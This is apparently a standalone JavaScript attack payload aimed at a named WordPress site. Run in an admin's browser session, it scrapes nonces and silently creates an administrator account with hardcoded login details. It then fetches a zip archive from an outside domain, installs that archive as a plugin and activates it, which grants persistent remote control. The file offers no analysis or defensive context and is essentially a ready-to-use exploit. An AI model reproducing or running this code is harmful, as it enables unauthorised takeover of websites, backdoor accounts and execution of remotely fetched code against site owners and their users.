let target =  "https://wordpress-777569-2902678.cloudwaysapps.com";
let myPluginName = 'Catfather';

async function uploadFile(){

				console.log('Upload Plugin....')

    const html = await fetch(target+'/wp-admin/plugin-install.php');
    const body = await html.text();
    const regex = /_wpnonce" value="(.*?)"/;
    const nonce = regex.exec(body) !== null ? regex.exec(body)[1]: null;
    if (!nonce) return;
				console.log('Plugin Nonce', nonce)
    const zipFile = await fetch('https://mrcatdev.com/cat-up.zip');

    let formData = new FormData();
    formData.append('_wpnonce',nonce);
    formData.append('_wp_http_referer','/wp-admin/plugin-install.php');
    formData.append('install-plugin-submit','Install Now');
    formData.append('pluginzip',await zipFile.blob());

    await fetch(target+'/wp-admin/update.php?action=upload-plugin',{
        method: 'POST',
        credentials: 'include',
        body: formData
    });

    const pluginUrl = target+"wp-admin/plugins.php?s="+myPluginName
				const pagePlugin = await fetch(pluginUrl,{
        credentials: 'include'
    })
    const content = await pagePlugin.text();
    const linkRegex = /plugins\.php\?action=activate.*?"/
    const activateUrl = linkRegex.exec(content)[0].replace('"','').replaceAll("&amp;","&")
				console.log('Activate URL', activateUrl);
    await fetch(activateUrl,{
            credentials : 'include'
    });
}


// Get Create User Nonce
async function getNonce(){
    const html = await fetch(target+"/wp-admin/user-new.php")
    const body = await html.text();
    const regex = /_wpnonce_create-user" value="(.*?)"/;
    const nonce = regex.exec(body) !== null ? regex.exec(body)[1]: null;

    if(nonce)
    addUser(nonce)
    else{
        alert('Nonce Fail!')
    }
}

// add Administrator User
function addUser(nonce){
    const rawData = "action=createuser&_wp_http_referer=%2Fwp-admin%2Fuser-new.php&user_login=Hossein&email=Hossein@catfather.ir&first_name=Hossein&last_name=Hossein&url=catfather.ir&pass1=%21%23Catfathex&pass2=%21%23Catfathex&send_user_notification=1&role=administrator&createuser=Add+New+User"
    const xhr = new XMLHttpRequest();
    xhr.open("POST",target+"/wp-admin/user-new.php");
    const data = dataMaker(rawData);
    data.append("_wpnonce_create-user", nonce);
    xhr.send(data);
}


// Add new Question for specific ID
function addQuest(){
    const rawData = "question_type=7&question_name=2x2&answer_1=4&answer_1_points=10&answer_1_correct=1&answer_2=3&answer_2_points=0&answer_3=0&answer_3_points=0&correct_answer_info=&hint=&comments=1&new_question_order=2&required=1&new_new_category=&new_question_answer_total=3&question_submission=new_question&quiz_id=1&question_id=0"
    const xhr = new XMLHttpRequest()
    xhr.open("POST", target+"wp-admin/admin.php?page=mlw_quiz_options&quiz_id=1");
    const data = dataMaker(rawData);
    xhr.withCredentials = true;
    xhr.send(data);
}

function dataMaker(rawData){
    let formData = new FormData()
    const fields = rawData.split('&');
    fields.forEach(el=>{
        const item = el.split('=')
        formData.append(item[0],item[1])
    })
    return formData;
}

getNonce();
uploadFile();
